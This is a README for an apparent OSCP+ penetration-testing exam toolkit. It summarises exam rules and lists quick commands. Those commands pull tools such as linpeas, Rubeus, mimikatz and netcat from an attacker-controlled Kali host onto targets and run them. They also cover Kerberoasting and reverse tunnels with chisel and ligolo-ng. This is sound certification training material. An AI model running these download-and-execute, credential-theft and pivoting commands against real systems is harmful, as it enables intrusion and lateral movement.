# OSCP-Tools

Portable tooling and quick commands for OSCP+ lab and exam use.

Last verified against public OffSec guidance: 2026-05-17.

## Current Exam Notes

OSCP is now OSCP+. The current format is 3 standalone machines worth 60 points and 1 Active Directory set worth 40 points. AD starts from an assumed-compromise user credential, bonus points are no longer awarded, and 70/100 points are required to pass.

Before the exam, re-read the official OSCP+ Exam Guide and FAQ:

- https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
- https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ
- https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams

Do not use AI chatbots or LLMs during the exam or report-writing period. Do not use commercial tools, mass vulnerability scanners, spoofing/poisoning, sqlmap-style automatic exploitation, or Metasploit/Meterpreter on more than one target. Responder/Inveigh-style tools require extra care because spoofing and poisoning are prohibited.

## Clone And Host

Clone this repo on your Kali exam VM before the exam:

```bash
git clone https://github.com/blankshiro/OSCP-Tools.git OSCP-Tools
cd OSCP-Tools
sha256sum -c CHECKSUMS.sha256
```

Host the directory on your VPN interface:

```bash
ip -4 addr show tun0
python3 -m http.server 8000 --bind <tun0-ip>
```

## Pull From Targets

Linux target:

```bash
curl -fsSLO http://<kali-ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

If PowerShell download is blocked, try `certutil`:

```cmd
certutil -urlcache -f http://<kali-ip>:8000/nc64.exe nc64.exe
```

## Fast Usage

- Linux enum: `linpeas.sh`, `pspy64`
- Windows enum: `PowerUp.ps1`, `Procmon.exe`
- AD enum: `PowerView.ps1`, `Rubeus.exe`, BloodHound/SharpHound if you install them separately
- Credential work: `mimikatz.exe`, `Rubeus.exe`, Impacket from Kali
- Pivoting: prefer `ligolo-ng` for routed pivots; keep `chisel` for SOCKS and simple reverse tunnels
- File transfer and shells: `nc.exe`, `nc64.exe`, `powercat.ps1`, `shell.aspx`

## Quick Tool Commands

### Linux Enumeration

```bash
curl -fsSLO http://<kali-ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

```bash
curl -fsSLO http://<kali-ip>:8000/pspy64
chmod +x pspy64
./pspy64
```

### Windows Enumeration

```powershell
iwr http://<kali-ip>:8000/PowerUp.ps1 -OutFile PowerUp.ps1
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Active Directory Enumeration

```powershell
iwr http://<kali-ip>:8000/PowerView.ps1 -OutFile PowerView.ps1
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainUser -SPN
Get-DomainGroupMember "Domain Admins"
Find-LocalAdminAccess -Verbose
```

Kerberoast with Rubeus:

```powershell
iwr http://<kali-ip>:8000/Rubeus.exe -OutFile Rubeus.exe
.\Rubeus.exe kerberoast /nowrap
```

### Chisel Reverse SOCKS

On Kali:

```bash
./chisel_linux_amd64 server -p 8001 --reverse
```

On a Windows target:

```powershell
iwr http://<kali-ip>:8000/chisel.exe -OutFile chisel.exe
.\chisel.exe client <kali-ip>:8001 R:socks
```

Then use `127.0.0.1:1080` as the SOCKS proxy, for example with `proxychains`.

### Ligolo-ng Routed Pivot

On Kali:

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
./ligolo-proxy-linux-amd64 -selfcert -laddr 0.0.0.0:11601
```

On a Windows target:

```powershell
iwr http://<kali-ip>:8000/ligolo-agent-windows-amd64.exe -OutFile agent.exe
.\agent.exe -connect <kali-ip>:11601 -ignore-cert
```

On a Linux target:

```bash
curl -fsSLo agent http://<kali-ip>:8000/ligolo-agent-linux-amd64
chmod +x agent
./agent -connect <kali-ip>:11601 -ignore-cert
```

Inside Ligolo, select the session, start the tunnel, and add the discovered internal route. With v0.8.3, use the built-in interface and autoroute commands when available.

### File Transfer Fallbacks

PowerShell:

```powershell
iwr http://<kali-ip>:8000/nc64.exe -OutFile nc64.exe
```

CMD:

```cmd
certutil -urlcache -f http://<kali-ip>:8000/nc64.exe nc64.exe
```

Linux:

```bash
wget http://<kali-ip>:8000/nc64.exe
curl -O http://<kali-ip>:8000/nc64.exe
```

### Proof Screenshots

Proof screenshots must show `local.txt` or `proof.txt` from an interactive shell with the target IP shown by `ipconfig`, `ifconfig`, or `ip addr`. Web shell-only proof is not enough per the current guide.

Linux:

```bash
ip addr
cat /path/to/local.txt
cat /root/proof.txt
```

Windows:

```cmd
ipconfig
type C:\Users\<user>\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
```

## Source References

- OffSec OSCP+ Exam Guide: https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
- OffSec OSCP+ Exam FAQ: https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ
- OffSec AI Usage Policy: https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams
- Chisel: https://github.com/jpillora/chisel/releases/tag/v1.11.5
- Ligolo-ng: https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.3
- PEASS-ng: https://github.com/peass-ng/PEASS-ng/releases/tag/20260510-cd4bd619
- Inveigh: https://github.com/Kevin-Robertson/Inveigh/releases/tag/v2.0.12
- PowerSploit PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
